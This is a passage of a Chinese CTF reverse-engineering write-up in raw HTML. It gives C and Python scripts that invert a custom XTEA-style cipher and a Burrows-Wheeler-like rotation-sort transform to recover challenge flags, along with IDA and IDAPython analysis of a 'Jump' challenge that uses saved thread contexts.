class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">43</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD tmp = v[<span class="number">0</span>];</span><br><span class="line">v[<span class="number">0</span>] = (<span class="built_in">LeftRotate</span>(v[<span class="number">0</span>], <span class="number">1</span>) &amp; <span class="built_in">LeftRotate</span>(v[<span class="number">0</span>], <span class="number">8</span>)) ^ <span class="built_in">LeftRotate</span>(v[<span class="number">0</span>], <span class="number">2</span>) ^ v[<span class="number">1</span>] ^ dword_80AFB60[i];</span><br><span class="line">v[<span class="number">1</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">DWORD tmp = v[<span class="number">0</span>];</span><br><span class="line">v[<span class="number">0</span>] = v[<span class="number">1</span>];</span><br><span class="line">v[<span class="number">1</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// input = &quot;12345678901234561234567890123456&quot;</span></span><br><span class="line">DWORD v[] = &#123; <span class="number">0X31323334</span> ,<span class="number">0X35363738</span>, <span class="number">0x39303132</span>, <span class="number">0x33343536</span>, <span class="number">0X31323334</span> ,<span class="number">0X35363738</span>, <span class="number">0x39303132</span>, <span class="number">0x33343536</span>&#125;;</span><br><span class="line"></span><br><span class="line">DWORD rounds[] = &#123; <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">enc11</span>(&amp;v[i]);</span><br><span class="line"><span class="built_in">encipher</span>(rounds[i/<span class="number">2</span>], &amp;v[i], xtea_key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来的任务就简单了，比着写解密脚本即可</p><p>exp为:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LeftRotate(word, bits) ( (word) <span class="meta-string">&lt;&lt; (bits) | (word) &gt;</span>&gt; (32 - (bits)) )</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> dword_80AFB60[<span class="number">44</span>] = &#123;</span><br><span class="line"><span class="number">0x04050607</span>, <span class="number">0x00010203</span>, <span class="number">0x0C0D0E0F</span>, <span class="number">0x08090A0B</span>, <span class="number">0xCD3FE81B</span>, <span class="number">0xD7C45477</span>, <span class="number">0x9F3E9236</span>, <span class="number">0x0107F187</span>,</span><br><span class="line"><span class="number">0xF993CB81</span>, <span class="number">0xBF74166C</span>, <span class="number">0xDA198427</span>, <span class="number">0x1A05ABFF</span>, <span class="number">0x9307E5E4</span>, <span class="number">0xCB8B0E45</span>, <span class="number">0x306DF7F5</span>, <span class="number">0xAD300197</span>,</span><br><span class="line"><span class="number">0xAA86B056</span>, <span class="number">0x449263BA</span>, <span class="number">0x3FA4401B</span>, <span class="number">0x1E41F917</span>, <span class="number">0xC6CB1E7D</span>, <span class="number">0x18EB0D7A</span>, <span class="number">0xD4EC4800</span>, <span class="number">0xB486F92B</span>,</span><br><span class="line"><span class="number">0x8737F9F3</span>, <span class="number">0x765E3D25</span>, <span class="number">0xDB3D3537</span>, <span class="number">0xEE44552B</span>, <span class="number">0x11D0C94C</span>, <span class="number">0x9B605BCB</span>, <span class="number">0x903B98B3</span>, <span class="number">0x24C2EEA3</span>,</span><br><span class="line"><span class="number">0x896E10A2</span>, <span class="number">0x2247F0C0</span>, <span class="number">0xB84E5CAA</span>, <span class="number">0x8D2C04F0</span>, <span class="number">0x3BC7842C</span>, <span class="number">0x1A50D606</span>, <span class="number">0x49A1917C</span>, <span class="number">0x7E1CB50C</span>,</span><br><span class="line"><span class="number">0xFC27B826</span>, <span class="number">0x5FDDDFBC</span>, <span class="number">0xDE0FC404</span>, <span class="number">0xB2B30907</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD xtea_key[<span class="number">4</span>] = &#123; <span class="number">0x03020100</span>, <span class="number">0x07060504</span>, <span class="number">0x0B0A0908</span>, <span class="number">0x0F0E0D0C</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decipher</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> num_rounds, DWORD v[<span class="number">2</span>], DWORD key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">DWORD v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], delta = <span class="number">0x10325476</span>, sum = delta * num_rounds;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">sum -= delta;</span><br><span class="line">v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line">v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enc11</span><span class="params">(DWORD* v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">43</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD tmp = v[<span class="number">0</span>];</span><br><span class="line">v[<span class="number">0</span>] = (<span class="built_in">LeftRotate</span>(v[<span class="number">0</span>], <span class="number">1</span>) &amp; <span class="built_in">LeftRotate</span>(v[<span class="number">0</span>], <span class="number">8</span>)) ^ <span class="built_in">LeftRotate</span>(v[<span class="number">0</span>], <span class="number">2</span>) ^ v[<span class="number">1</span>] ^ dword_80AFB60[i];</span><br><span class="line">v[<span class="number">1</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">DWORD tmp = v[<span class="number">0</span>];</span><br><span class="line">v[<span class="number">0</span>] = v[<span class="number">1</span>];</span><br><span class="line">v[<span class="number">1</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dec11</span><span class="params">(DWORD* v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD tmp = v[<span class="number">0</span>];</span><br><span class="line">v[<span class="number">0</span>] = v[<span class="number">1</span>];</span><br><span class="line">v[<span class="number">1</span>] = tmp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//************************</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">43</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">tmp = v[<span class="number">0</span>];</span><br><span class="line">v[<span class="number">0</span>] = v[<span class="number">1</span>];</span><br><span class="line">v[<span class="number">1</span>] = (<span class="built_in">LeftRotate</span>(v[<span class="number">0</span>], <span class="number">1</span>) &amp; <span class="built_in">LeftRotate</span>(v[<span class="number">0</span>], <span class="number">8</span>)) ^ <span class="built_in">LeftRotate</span>(v[<span class="number">0</span>], <span class="number">2</span>) ^ tmp ^ dword_80AFB60[<span class="number">43</span>-i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD enc[] = &#123; <span class="number">0xFDF5C266</span>, <span class="number">0x7A328286</span>, <span class="number">0xCE944004</span>, <span class="number">0x5DE08ADC</span>, <span class="number">0xA6E4BD0A</span>, <span class="number">0x16CAADDC</span>, <span class="number">0x13CD6F0C</span>, <span class="number">0x1A75D936</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//input = &quot;1234567890abcdefghijklmn12366666&quot;</span></span><br><span class="line"><span class="comment">//DWORD enc[] = &#123; 0x4A16D2F5, 0x3995DF74, 0xC0B2BC9A, 0x313495AC, 0x207EAA57, 0x5C46F1CB, 0x9AB2B6D3, 0xF0E536C3 &#125;;</span></span><br><span class="line">DWORD rounds[] = &#123; <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">decipher</span>(rounds[i / <span class="number">2</span>], &amp;enc[i], xtea_key);</span><br><span class="line"><span class="built_in">dec11</span>(&amp;enc[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span>* flag = (<span class="keyword">char</span>*)enc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i+<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i + <span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i + <span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mM7pJIobsCTQPO6R0g-L8kFExhYuivBN</span></span><br></pre></td></tr></table></figure><h2 id="Jump"><a href="#Jump" class="headerlink" title="Jump"></a>Jump</h2><p>IDA打开，发现符号都被去除了，用Finger恢复一下符号 <a href="https://github.com/aliyunav/Finger">https://github.com/aliyunav/Finger</a> ，我只能说这个工具太牛逼了</p><p>Finger分析前</p><img src="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/image-20220417213946452.png" class="" title="image-20220417213946452"><p>Finger分析后</p><img src="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/image-20220417214325367.png" class="" title="image-20220417214325367"><p>爽歪歪~~~ 开始分析</p><p>程序起名叫Jump，而在调试的过程中，发现确实是Jump，程序从一个地方调到了另一个地方，于是谷歌搜索，找到一篇文章 <a href="https://blog.csdn.net/dog250/article/details/89742140">https://blog.csdn.net/dog250/article/details/89742140</a>  感觉跟题目好像，就是保存线程上下文，然后恢复这个线程上下文来实现跳转</p><p>经过分析，找到了save_ctx和restore_ctx函数</p><img src="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/image-20220417201238954.png" class="" title="image-20220417201238954"><p>后面的第一个参数其实就是context, 逆向了下这个save_ctx,发现context结构大致如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> ctx struc ; (<span class="keyword">sizeof</span>=<span class="number">0x60</span>, mappedto_18)</span><br><span class="line"><span class="number">00000000</span> _rbx dq ?</span><br><span class="line"><span class="number">00000008</span> _enc_rbp dq ?</span><br><span class="line"><span class="number">00000010</span> _r12 dq ?</span><br><span class="line"><span class="number">00000018</span> _r13 dq ?</span><br><span class="line"><span class="number">00000020</span> _r14 dq ?</span><br><span class="line"><span class="number">00000028</span> _r15 dq ?</span><br><span class="line"><span class="number">00000030</span> _enc_rsp_8 dq ?                         ; [rsp+<span class="number">8</span>] enc</span><br><span class="line"><span class="number">00000038</span> _enc_rsp_0 dq ?                         ; [rsp] --&gt; rip</span><br><span class="line"><span class="number">00000040</span> _rsi dq ?                               ; 当rsi为<span class="number">0</span>的时候，这个位置存rsi寄存器的值</span><br><span class="line"><span class="number">00000048</span> field_48 dq ?</span><br><span class="line"><span class="number">00000050</span> field_50 dq ?</span><br><span class="line"><span class="number">00000058</span> _rax dq ?</span><br><span class="line"><span class="number">00000060</span> ctx ends</span><br></pre></td></tr></table></figure><p>调试找到最终比较的位置</p><img src="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/image-20220417201451026.png" class="" title="image-20220417201451026"><p>密文是[0x03, 0x6A, 0x6D, 0x47, 0x6E, 0x5F, 0x3D, 0x75, 0x61, 0x53, 0x5A, 0x4C, 0x76, 0x4E, 0x34, 0x77, 0x46, 0x78, 0x45, 0x36, 0x52, 0x2B, 0x70, 0x02, 0x44, 0x32, 0x71, 0x56, 0x31, 0x43, 0x42, 0x54, 0x63, 0x6B]</p><p>sub_401F62 是关键加密函数，他把这个矩阵每一行，按第一个字符大小进行排序，然后排完序的这个矩阵的最后一列就是密文，现在知道这个矩阵的第一列和最后一列，来求flag</p><p>举个例子，假如我们输入的是<code>985236147adgjlqwesxzcvbnmfuiopvx</code>, 程序先将其前加上\x02尾部加上\x03</p><img src="/2022/04/17/statCTF_%E9%83%A8%E5%88%86RE_WP/image-20220417201957613.png" class="" title="image-20220417201957613"><p>然后一层层循环左移1个字符，循环33次，将循环后的二维数组保存在0000004C9408处，通过下面的IDApython打印出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">addr =[<span class="number">0x00000000004CC0D0</span>, <span class="number">0x00000000004CC100</span>, <span class="number">0x00000000004CC130</span>, <span class="number">0x00000000004CC160</span>, <span class="number">0x00000000004CC190</span>, <span class="number">0x00000000004CC1C0</span>, <span class="number">0x00000000004CC1F0</span>, <span class="number">0x00000000004CC220</span>, <span class="number">0x00000000004CC250</span>, <span class="number">0x00000000004CC280</span>, <span class="number">0x00000000004CC2B0</span>, <span class="number">0x00000000004CC2E0</span>, <span class="number">0x00000000004CC310</span>, <span class="number">0x00000000004CC340</span>, <span class="number">0x00000000004CC370</span>, <span class="number">0x00000000004CC3A0</span>, <span class="number">0x00000000004CC3D0</span>, <span class="number">0x00000000004CC400</span>, <span class="number">0x00000000004CC430</span>, <span class="number">0x00000000004CC460</span>, <span class="number">0x00000000004CC490</span>, <span class="number">0x00000000004CC4C0</span>, <span class="number">0x00000000004CC4F0</span>, <span class="number">0x00000000004CC520</span>, <span class="number">0x00000000004CC550</span>, <span class="number">0x00000000004CC580</span>, <span class="number">0x00000000004CC5B0</span>, <span class="number">0x00000000004CC5E0</span>, <span class="number">0x00000000004CC610</span>, <span class="number">0x00000000004CC640</span>, <span class="number">0x00000000004CC670</span>, <span class="number">0x00000000004CC6A0</span>, <span class="number">0x00000000004CC6D0</span>, <span class="number">0x00000000004CC700</span>] <span class="comment"># 0000004C9408处存的34个指针</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">    tmp = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">        tmp += get_bytes(addr[i]+j, <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\x02985236147adgjlqwesxzcvbnmfuiopvx\x03&#x27;</span></span><br><span class="line"><span class="string">b&#x27;985236147adgjlqwesxzcvbnmfuiopvx\x03\x02&#x27;</span></span><br><span class="line"><span class="string">b&#x27;85236147adgjlqwesxzcvbnmfuiopvx\x03\x029&#x27;</span></span><br><span class="line"><span class="string">b&#x27;5236147adgjlqwesxzcvbnmfuiopvx\x03\x0298&#x27;</span></span><br><span class="line"><span class="string">b&#x27;236147adgjlqwesxzcvbnmfuiopvx\x03\x02985&#x27;</span></span><br><span class="line"><span class="string">b&#x27;36147adgjlqwesxzcvbnmfuiopvx\x03\x029852&#x27;</span></span><br><span class="line"><span class="string">b&#x27;6147adgjlqwesxzcvbnmfuiopvx\x03\x0298523&#x27;</span></span><br><span class="line"><span class="string">b&#x27;147adgjlqwesxzcvbnmfuiopvx\x03\x02985236&#x27;</span></span><br><span class="line"><span class="string">b&#x27;47adgjlqwesxzcvbnmfuiopvx\x03\x029852361&#x27;</span></span><br><span class="line"><span class="string">b&#x27;7adgjlqwesxzcvbnmfuiopvx\x03\x0298523614&#x27;</span></span><br><span class="line"><span class="string">b&#x27;adgjlqwesxzcvbnmfuiopvx\x03\x02985236147&#x27;</span></span><br><span class="line"><span class="string">b&#x27;dgjlqwesxzcvbnmfuiopvx\x03\x02985236147a&#x27;</span></span><br><span class="line"><span class="string">b&#x27;gjlqwesxzcvbnmfuiopvx\x03\x02985236147ad&#x27;</span></span><br><span class="line"><span class="string">b&#x27;jlqwesxzcvbnmfuiopvx\x03\x02985236147adg&#x27;</span></span><br><span class="line"><span class="string">b&#x27;lqwesxzcvbnmfuiopvx\x03\x02985236147adgj&#x27;</span></span><br><span class="line"><span class="string">b&#x27;qwesxzcvbnmfuiopvx\x03\x02985236147adgjl&#x27;</span></span><br><span class="line"><span class="string">b&#x27;wesxzcvbnmfuiopvx\x03\x02985236147adgjlq&#x27;</span></span><br><span class="line"><span class="string">b&#x27;esxzcvbnmfuiopvx\x03\x02985236147adgjlqw&#x27;</span></span><br><span class="line"><span class="string">b&#x27;sxzcvbnmfuiopvx\x03\x02985236147adgjlqwe&#x27;</span></span><br><span class="line"><span class="string">b&#x27;xzcvbnmfuiopvx\x03\x02985236147adgjlqwes&#x27;</span></span><br><span class="line"><span class="string">b&#x27;zcvbnmfuiopvx\x03\x02985236147adgjlqwesx&#x27;</span></span><br><span class="line"><span class="string">b&#x27;cvbnmfuiopvx\x03\x02985236147adgjlqwesxz&#x27;</span></span><br><span class="line"><span class="string">b&#x27;vbnmfuiopvx\x03\x02985236147adgjlqwesxzc&#x27;</span></span><br><span class="line"><span class="string">b&#x27;bnmfuiopvx\x03\x02985236147adgjlqwesxzcv&#x27;</span></span><br><span class="line"><span class="string">b&#x27;nmfuiopvx\x03\x02985236147adgjlqwesxzcvb&#x27;</span></span><br><span class="line"><span class="string">b&#x27;mfuiopvx\x03\x02985236147adgjlqwesxzcvbn&#x27;</span></span><br><span class="line"><span class="string">b&#x27;fuiopvx\x03\x02985236147adgjlqwesxzcvbnm&#x27;</span></span><br><span class="line"><span class="string">b&#x27;uiopvx\x03\x02985236147adgjlqwesxzcvbnmf&#x27;</span></span><br><span class="line"><span class="string">b&#x27;iopvx\x03\x02985236147adgjlqwesxzcvbnmfu&#x27;</span></span><br><span class="line"><span class="string">b&#x27;opvx\x03\x02985236147adgjlqwesxzcvbnmfui&#x27;</span></span><br><span class="line"><span class="string">b&#x27;pvx\x03\x02985236147adgjlqwesxzcvbnmfuio&#x27;</span></span><br><span class="line"><span class="string">b&#x27;vx\x03\x02985236147adgjlqwesxzcvbnmfuiop&#x27;</span></span><br><span class="line"><span class="string">b&#x27;x\x03\x02985236147adgjlqwesxzcvbnmfuiopv&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x03\x02985236147adgjlqwesxzcvbnmfuiopvx&#x27;</span></span><br></pre></td></tr></table></figure><p>然后经过sub_401F62函数，再重新查看0000004C9408处的指针，发现顺序与之前不一样，重新整理IDApython脚本，再打印下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\x02985236147adgjlqwesxzcvbnmfuiopvx\x03&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x03\x02985236147adgjlqwesxzcvbnmfuiopvx&#x27;</span></span><br><span class="line"><span class="string">b&#x27;147adgjlqwesxzcvbnmfuiopvx\x03\x02985236&#x27;</span></span><br><span class="line"><span class="string">b&#x27;236147adgjlqwesxzcvbnmfuiopvx\x03\x02985&#x27;</span></span><br><span class="line"><span class="string">b&#x27;36147adgjlqwesxzcvbnmfuiopvx\x03\x029852&#x27;</span></span><br><span class="line"><span class="string">b&#x27;47adgjlqwesxzcvbnmfuiopvx\x03\x029852361&#x27;</span></span><br><span class="line"><span class="string">b&#x27;5236147adgjlqwesxzcvbnmfuiopvx\x03\x0298&#x27;</span></span><br><span class="line"><span class="string">b&#x27;6147adgjlqwesxzcvbnmfuiopvx\x03\x0298523&#x27;</span></span><br><span class="line"><span class="string">b&#x27;7adgjlqwesxzcvbnmfuiopvx\x03\x0298523614&#x27;</span></span><br><span class="line"><span class="string">b&#x27;85236147adgjlqwesxzcvbnmfuiopvx\x03\x029&#x27;</span></span><br><span class="line"><span class="string">b&#x27;985236147adgjlqwesxzcvbnmfuiopvx\x03\x02&#x27;</span></span><br><span class="line"><span class="string">b&#x27;adgjlqwesxzcvbnmfuiopvx\x03\x02985236147&#x27;</span></span><br><span class="line"><span class="string">b&#x27;bnmfuiopvx\x03\x02985236147adgjlqwesxzcv&#x27;</span></span><br><span class="line"><span class="string">b&#x27;cvbnmfuiopvx\x03\x02985236147adgjlqwesxz&#x27;</span></span><br><span class="line"><span class="string">b&#x27;dgjlqwesxzcvbnmfuiopvx\x03\x02985236147a&#x27;</span></span><br><span class="line"><span class="string">b&#x27;esxzcvbnmfuiopvx\x03\x02985236147adgjlqw&#x27;</span></span><br><span class="line"><span class="string">b&#x27;fuiopvx\x03\x02985236147adgjlqwesxzcvbnm&#x27;</span></span><br><span class="line"><span class="string">b&#x27;gjlqwesxzcvbnmfuiopvx\x03\x02985236147ad&#x27;</span></span><br><span class="line"><span class="string">b&#x27;iopvx\x03\x02985236147adgjlqwesxzcvbnmfu&#x27;</span></span><br><span class="line"><span class="string">b&#x27;jlqwesxzcvbnmfuiopvx\x03\x02985236147adg&#x27;</span></span><br><span class="line"><span class="string">b&#x27;lqwesxzcvbnmfuiopvx\x03\x02985236147adgj&#x27;</span></span><br><span class="line"><span class="string">b&#x27;mfuiopvx\x03\x02985236147adgjlqwesxzcvbn&#x27;</span></span><br><span class="line"><span class="string">b&#x27;nmfuiopvx\x03\x02985236147adgjlqwesxzcvb&#x27;</span></span><br><span class="line"><span class="string">b&#x27;opvx\x03\x02985236147adgjlqwesxzcvbnmfui&#x27;</span></span><br><span class="line"><span class="string">b&#x27;pvx\x03\x02985236147adgjlqwesxzcvbnmfuio&#x27;</span></span><br><span class="line"><span class="string">b&#x27;qwesxzcvbnmfuiopvx\x03\x02985236147adgjl&#x27;</span></span><br><span class="line"><span class="string">b&#x27;sxzcvbnmfuiopvx\x03\x02985236147adgjlqwe&#x27;</span></span><br><span class="line"><span class="string">b&#x27;uiopvx\x03\x02985236147adgjlqwesxzcvbnmf&#x27;</span></span><br><span class="line"><span class="string">b&#x27;vbnmfuiopvx\x03\x02985236147adgjlqwesxzc&#x27;</span></span><br><span class="line"><span class="string">b&#x27;vx\x03\x02985236147adgjlqwesxzcvbnmfuiop&#x27;</span></span><br><span class="line"><span class="string">b&#x27;wesxzcvbnmfuiopvx\x03\x02985236147adgjlq&#x27;</span></span><br><span class="line"><span class="string">b&#x27;x\x03\x02985236147adgjlqwesxzcvbnmfuiopv&#x27;</span></span><br><span class="line"><span class="string">b&#x27;xzcvbnmfuiopvx\x03\x02985236147adgjlqwes&#x27;</span></span><br><span class="line"><span class="string">b&#x27;zcvbnmfuiopvx\x03\x02985236147adgjlqwesx&#x27;</span></span><br></pre></td></tr></table></figure><p>每一行是按照第一个字符从小到大排序，而拍完序的最后一列，正好是000004C9420 存储的加密后的flag</p><p>现在已知密文是<code>\x03jmGn_=uaSZLvN4wFxE6R+p\x02D2qV1CBTck</code>,将其排序后为<code>\x02\x03+1246=BCDEFGLNRSTVZ_acjkmnpquvwx</code></p><p>知道这个二位数组的第一列的每个字符和最后一列的每个字符，因为每一行的第一个字符和最后一个字符在原始字符串中肯定是挨着了，这样就可以慢慢推出原始字符串来了，写脚本解一下即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lie1 = <span class="built_in">list</span>(<span class="string">b&#x27;\x02\x03+1246=BCDEFGLNRSTVZ_acjkmnpquvwx&#x27;</span>)</span><br><span class="line">lie34 = <span class="built_in">list</span>(<span class="string">b&#x27;\x03jmGn_=uaSZLvN4wFxE6R+p\x02D2qV1CBTck&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = [<span class="number">2</span>] + [<span class="number">0</span>] * <span class="number">33</span></span><br><span class="line"></span><br><span class="line">map_ = [[lie1[i], lie34[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>)]</span><br><span class="line"><span class="comment"># print(map_)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):</span><br><span class="line">    tmp = lie34.index(flag[i])</span><br><span class="line">    flag[i+<span class="number">1</span>] = lie1[tmp]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span 